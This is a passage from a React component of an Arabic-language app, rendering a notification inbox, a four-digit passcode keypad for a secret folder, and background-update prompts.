                        }
                      });
                    }}
                    className="px-3 py-1.5 bg-red-500/10 text-red-500 rounded-lg text-[10px] font-bold transition-all hover:bg-red-500/25 cursor-pointer"
                  >
                    مسح الصندوق 🗑️
                  </button>
                </div>

                <div className="space-y-3 overflow-y-auto flex-1 pr-1 scrollbar-thin" dir="rtl">
                  {(() => {
                    const userNotifications = notifications.filter(notif => {
                      if (notif.phone && notif.phone !== userPhone) {
                        return false;
                      }
                      return true;
                    });
                    if (userNotifications.length === 0) {
                      return (
                        <div className="flex flex-col items-center justify-center py-20 text-center space-y-3">
                          <div className="p-4 bg-gray-50 dark:bg-white/5 rounded-full text-gray-400">
                            <MailOpen size={30} />
                          </div>
                          <p className="text-xs text-gray-500 font-bold">صندوق تنبيهاتك فارغ حالياً ✨</p>
                          <p className="text-[10px] text-gray-500/60 font-medium">روح الذكية ترسل لك أعذب التحايا والبركات.</p>
                        </div>
                      );
                    }
                    return userNotifications.map(notif => (
                      <div 
                        key={notif.id}
                        className={cn(
                          "p-4 rounded-3xl border transition-all relative flex flex-col gap-1 text-right cursor-pointer",
                          notif.read 
                            ? "bg-gray-50/50 dark:bg-white/5 border-gray-100 dark:border-white/5" 
                            : "bg-emerald-600/10 dark:bg-emerald-500/10 border-emerald-500/20 shadow-sm"
                        )}
                        onClick={() => {
                          setNotifications(p => p.map(n => n.id === notif.id ? { ...n, read: true } : n));
                        }}
                      >
                        {!notif.read && (
                          <span className="absolute top-4 left-4 w-2 h-2 bg-rose-500 rounded-full animate-pulse" />
                        )}
                        <div className="flex items-center gap-2 justify-start">
                          {notif.type === 'new_message' && <MessageSquare size={14} className="text-blue-500" />}
                          {notif.type === 'friend_add' && <Users size={14} className="text-emerald-500" />}
                          {notif.type === 'system' && <Sparkles size={14} className="text-amber-500" />}
                          <span className="text-xs font-black text-gray-900 dark:text-gray-100 italic">{notif.title}</span>
                        </div>
                        <p className="text-[11px] text-gray-650 dark:text-gray-300 font-medium leading-relaxed mt-1">{notif.body}</p>
                        <span className="text-[8px] text-gray-500/80 font-bold uppercase mt-1 block">
                          {new Date(notif.timestamp).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' })}{' '}
                          {new Date(notif.timestamp).toLocaleDateString('ar-EG', { day: 'numeric', month: 'short' })}
                        </span>
                      </div>
                    ))
                  })()}
                </div>
              </div>

              <div className="border-t border-gray-100 dark:border-white/5 pt-4 text-center mt-4">
                <span className="text-[9px] text-gray-500 font-bold uppercase italic tracking-widest block animate-pulse">
                  {isOnline ? '● متصل بالسحابة الفورية لروح' : '○ وضع الأوفلاين نشط'}
                </span>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {showPasscodeModal && (
          <div className="fixed inset-0 z-[100000] flex items-center justify-center p-4 bg-black/90 backdrop-blur-3xl overflow-hidden">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="bg-[#121417] border border-white/10 p-8 rounded-[50px] w-full max-w-sm shadow-2xl relative"
            >
              <button 
                onClick={() => setShowPasscodeModal(false)}
                className="absolute top-6 left-6 p-2 text-gray-500 hover:text-white transition-colors"
              >
                <X size={20} />
              </button>

              <div className="flex flex-col items-center gap-6 pt-4">
                <div className="w-20 h-20 bg-blue-600/20 rounded-3xl flex items-center justify-center text-blue-400 border border-blue-500/30">
                  <FolderKey size={40} className="animate-pulse" />
                </div>
                
                <div className="text-center space-y-2">
                  <h3 className="text-2xl font-black text-white italic">المجلد السري</h3>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest leading-relaxed">أدخل الرمز الخاص للوصول إلى كنوزك المخفية</p>
                </div>

                <div className="w-full space-y-4">
                  <div className="flex justify-center gap-3" dir="ltr">
                    {[0, 1, 2, 3].map(i => (
                      <div 
                        key={i}
                        className={cn(
                          "w-12 h-14 rounded-2xl border-2 flex items-center justify-center text-xl font-black transition-all",
                          passcode.length > i ? "border-blue-500 bg-blue-600/10 text-white shadow-[0_0_15px_rgba(59,130,246,0.3)]" : "border-gray-800 bg-black/40 text-gray-700"
                        )}
                      >
                        {passcode.length > i ? '•' : ''}
                      </div>
                    ))}
                  </div>
                  
                  <div className="grid grid-cols-3 gap-3 pt-4">
                    {[1, 2, 3, 4, 5, 6, 7, 8, 9, 'DEL', 0].map(n => (
                      <button
                        key={n}
                        onClick={() => {
                          if (n === 'DEL') {
                            setPasscode(prev => prev.slice(0, -1));
                          } else if (passcode.length < 4) {
                            const newCode = passcode + n;
                            setPasscode(newCode);
                            if (newCode.length === 4) {
                              verifyPasscode(newCode);
                            }
                          }
                        }}
                        className={cn(
                          "h-14 rounded-2xl flex items-center justify-center font-black italic transition-all active:scale-90",
                          n === 'DEL' ? "bg-red-900/20 text-red-500 border border-red-500/10 text-xs" : "bg-white/5 text-white hover:bg-white/10 border border-white/5 text-lg"
                        )}
                      >
                        {n}
                      </button>
                    ))}
                  </div>
                </div>

                <p className="text-[10px] text-gray-600 font-bold italic animate-pulse">🔒 المجلد مشفر تماماً</p>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Background updating micro notification */}
      <AnimatePresence>
        {isBackgroundUpdating && (
          <motion.div 
            initial={{ opacity: 0, y: 50, scale: 0.9 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, scale: 0.9 }}
            className="fixed bottom-6 right-6 z-[99999] bg-[#121417]/95 backdrop-blur-md border border-white/10 p-4 rounded-3xl flex items-center gap-3 shadow-2xl shrink-0 select-none max-w-xs"
          >
            <div className="relative flex items-center justify-center w-10 h-10 shrink-0">
              <svg className="w-full h-full transform -rotate-90">
                <circle cx="20" cy="20" r="16" className="text-gray-800" strokeWidth="3" stroke="currentColor" fill="transparent" />
                <circle cx="20" cy="20" r="16" className="text-red-500 transition-all duration-300" strokeWidth="3" strokeDasharray={100} strokeDashoffset={100 - updateProgress} strokeLinecap="round" stroke="currentColor" fill="transparent" />
              </svg>
              <span className="absolute text-[8px] font-black text-rose-450 font-mono">{updateProgress}%</span>
            </div>
            <div className="text-right">
              <p className="text-[10px] font-black text-rose-450">جاري ترقية تطبيق روح التلقائي...</p>
              <p className="text-[8px] text-gray-500 font-bold italic">التحميل بالخلفية مستمر بسلاسة ✨</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Global Auto Update Modal Overlay */}
      <AnimatePresence>
        {showUpdateModal && (
          <div className="fixed inset-0 z-[100000] flex items-center justify-center p-4 bg-black/95 backdrop-blur-3xl overflow-hidden">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="bg-[#121417] border border-white/10 p-8 rounded-[50px] w-full max-w-sm shadow-2xl relative text-center flex flex-col items-center gap-6"
            >
              <div className="w-20 h-20 bg-emerald-600/20 rounded-3xl flex items-center justify-center text-emerald-400 border border-emerald-500/30">
                <ShieldCheck size={40} className="animate-bounce" />
              </div>
              
              <div className="space-y-2">
                <h3 className="text-xl font-black text-white italic">تحديث تطبيق روح 🎉</h3>
                <p className="text-[12px] text-gray-300 font-bold leading-relaxed">
                  لقد تم تجهيز التحديث والملخص آلياً بنجاح بالخلفية بدون استهلاك وقتك. هل تود تثبيته الآن أم لاحقاً؟
                </p>
              </div>

              <div className="w-full flex flex-col gap-2">
                <button
                  onClick={() => {
                    setShowUpdateModal(false);
                    window.location.reload();
                  }}
                  className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 text-white font-black rounded-2xl transition-all active:scale-95 shadow-lg shadow-emerald-600/20 text-xs cursor-pointer"
                >
                  تثبيت الآن 🚀
                </button>
                <button
                  onClick={() => {
                    setShowUpdateModal(false);
                  }}
                  className="w-full py-3 bg-white/5 hover:bg-white/10 text-gray-400 hover:text-white font-black rounded-2xl transition-all active:scale-95 text-xs cursor-pointer"
                >
                  لاحقاً ⏳
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
